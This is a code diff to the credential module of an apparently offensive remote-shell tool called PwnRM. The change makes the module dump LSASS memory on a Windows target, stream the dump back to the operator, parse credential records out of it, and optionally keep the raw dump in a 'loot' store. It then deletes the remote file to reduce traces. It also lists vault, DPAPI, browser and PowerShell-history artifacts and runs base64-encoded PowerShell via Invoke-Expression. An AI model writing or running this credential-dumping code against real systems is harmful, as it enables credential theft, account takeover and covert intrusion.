@@ -1,17 +1,19 @@
 """Credential artifact reconnaissance and explicit current-user DPAPI unprotect."""
 
 import base64
+import secrets
 from pathlib import PureWindowsPath
 from typing import List, Any
 
 from . import BaseModule
+from ..core.credential_dump import parse_lsass_minidump, zeroize
 from ..shell.ui import c, M, BLD
 from ..shell.commands import b64str
 
 
 class CredsModule(BaseModule):
     name = "creds"
-    description = "Credential artifact inventory, DPAPI unprotect, and explicit LSASS dump staging"
+    description = "Credential artifact inventory, DPAPI unprotect, and ephemeral LSASS parsing"
     author = "uziii2208"
     options = {
         "vault": {"desc": "Enumerate Windows Credential Manager and Vault metadata"},
@@ -19,14 +21,16 @@ class CredsModule(BaseModule):
         "decrypt": {"desc": "Unprotect one Base64 DPAPI blob as the current user: decrypt <B64>"},
         "history": {"desc": "Display recent PowerShell console history"},
         "browser": {"desc": "Locate Chrome, Edge and Brave credential database artifacts"},
-        "lsa": {"desc": "Stage a full LSASS minidump (administrator/SeDebug required)"},
-        "--lsa-output": {"desc": "Remote dump path used with lsa: --lsa-output <PATH>"},
+        "lsa": {"desc": "Parse an ephemeral LSASS minidump (administrator/SeDebug required)"},
+        "--lsa-output": {"desc": "Remote temporary path used with lsa; always deleted"},
+        "--download": {"desc": "Retain the raw LSASS dump in the local PwnRM loot store"},
     }
 
     def run(self, shell, args: List[str]) -> Any:
         selected = set()
         decrypt_blob = ""
         lsa_output = ""
+        retain_download = False
         idx = 0
         while idx < len(args):
             raw_arg = args[idx]
@@ -62,6 +66,10 @@ class CredsModule(BaseModule):
                     return {"status": "error", "error": "invalid LSASS output path"}
                 idx += 2
                 continue
+            if arg == "--download":
+                retain_download = True
+                idx += 1
+                continue
             if arg in {"vault", "dpapi", "history", "browser", "lsa"}:
                 selected.add(arg)
                 idx += 1
@@ -72,9 +80,33 @@ class CredsModule(BaseModule):
         if lsa_output and "lsa" not in selected:
             shell.write_warning("  [-] --lsa-output is only valid together with the lsa mode.")
             return {"status": "error", "error": "LSASS output path without lsa mode"}
+        if retain_download and "lsa" not in selected:
+            shell.write_warning("  [-] --download is only valid together with the lsa mode.")
+            return {"status": "error", "error": "download without lsa mode"}
 
         if not selected:
             selected = {"vault", "dpapi", "history", "browser"}
+
+        if "lsa" in selected and not lsa_output:
+            try:
+                remote_temp = shell._validate_remote_path(
+                    shell.run_sync("[System.IO.Path]::GetTempPath()").strip()
+                )
+                lsa_output = str(
+                    PureWindowsPath(remote_temp) /
+                    f"pwnrm_lsass_{secrets.token_hex(16)}.dmp"
+                )
+            except (OSError, ValueError) as exc:
+                shell.write_error(f"  [-] Could not resolve a safe remote LSASS staging path: {exc}")
+                return {"status": "error", "error": "unsafe LSASS staging path"}
+
+        if "lsa" in selected:
+            exists = shell.run_sync(
+                f"Test-Path -LiteralPath '{shell._pse(lsa_output)}'"
+            ).strip().lower() == "true"
+            if exists:
+                shell.write_error(f"  [-] Refusing to overwrite existing remote path: {lsa_output}")
+                return {"status": "error", "error": "LSASS staging path already exists"}
 
         shell.write_info(c(M + BLD, "  [*] PwnRM Creds Engine — scanning selected credential artifact locations..."))
 
@@ -257,8 +289,7 @@ if ($doLsa) {
         Write-Host "  [+] LSASS dump staged : $dumpPath" -ForegroundColor Green
         Write-Host "      Size              : $($dump.Length) bytes" -ForegroundColor Gray
         Write-Host "      SHA-256           : $dumpHash" -ForegroundColor Gray
-        Write-Host "  [*] Download with: !download $dumpPath" -ForegroundColor Cyan
-        Write-Warning "Remove the remote dump after acquisition; PwnRM does not auto-delete evidence before download."
+        Write-Host "  [*] PwnRM will parse this dump and remove it immediately." -ForegroundColor Cyan
     } catch {
         $failure = $_.Exception.Message
         if ($dumpPath) {
@@ -294,6 +325,77 @@ Write-Host "`n  [*] Credential artifact scan complete." -ForegroundColor Cyan
 
         encoded = b64str(ps.encode("utf-16le"))
         command = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
-        if shell.run_with_interrupt(command, shell.write_line):
-            return {"status": "interrupted"}
-        return {"status": "completed", "selected": sorted(selected)}
+        error_count = len(getattr(shell, "last_run_errors", []))
+        interrupted = shell.run_with_interrupt(command, shell.write_line)
+        if "lsa" not in selected:
+            if interrupted:
+                return {"status": "interrupted"}
+            return {"status": "completed", "selected": sorted(selected)}
+
+        dump_data = None
+        result = {"status": "interrupted"} if interrupted else {"status": "error"}
+        try:
+            new_errors = getattr(shell, "last_run_errors", [])[error_count:]
+            if interrupted:
+                pass
+            elif new_errors:
+                result = {
+                    "status": "error",
+                    "error": "; ".join(new_errors),
+                    "selected": sorted(selected),
+                }
+            else:
+                shell.write_info(c(M + BLD, "\n  [*] Streaming LSASS dump into protected operator memory..."))
+                dump_data = shell.read_remote_file(lsa_output)
+                records = parse_lsass_minidump(dump_data)
+                shell.write_info(c(M + BLD, "\n  [*] Extracted LSASS credential material"))
+                if records:
+                    for record in records:
+                        shell.write_info(f"    {record}")
+                else:
+                    shell.write_warning("  [-] No printable LSASS credential material was extracted.")
+
+                retained = []
+                if retain_download:
+                    target = str(getattr(shell, "target_info", {}).get("host", "target"))
+                    saved = shell.loot_mgr.store_artifact(
+                        target,
+                        "dumps",
+                        PureWindowsPath(lsa_output).name,
+                        dump_data,
+                        source_command="!creds lsa --download",
+                    )
+                    retained.append(saved)
+                    shell.write_info(c(M, f"  [+] Retained LSASS dump: {saved}"))
+                result = {
+                    "status": "completed",
+                    "selected": sorted(selected),
+                    "records": len(records),
+                    "downloaded": retained,
+                }
+        except Exception as exc:
+            shell.write_error(f"  [-] LSASS parsing failed: {exc}")
+            result = {
+                "status": "error",
+                "error": str(exc),
+                "selected": sorted(selected),
+            }
+        finally:
+            if dump_data is not None:
+                zeroize([dump_data])
+            try:
+                cleaned = shell.delete_remote_path(lsa_output)
+            except Exception as exc:
+                cleaned = False
+                shell.write_error(f"  [-] Remote LSASS cleanup failed: {exc}")
+            if not cleaned:
+                shell.write_error(f"  [-] Remote LSASS dump still requires cleanup: {lsa_output}")
+                result = {
+                    "status": "error",
+                    "error": "remote LSASS cleanup failed",
+                    "path": lsa_output,
+                    "selected": sorted(selected),
+                }
+            else:
+                shell.write_info(c(M, f"  [+] Remote LSASS dump removed: {lsa_output}"))
+        return result
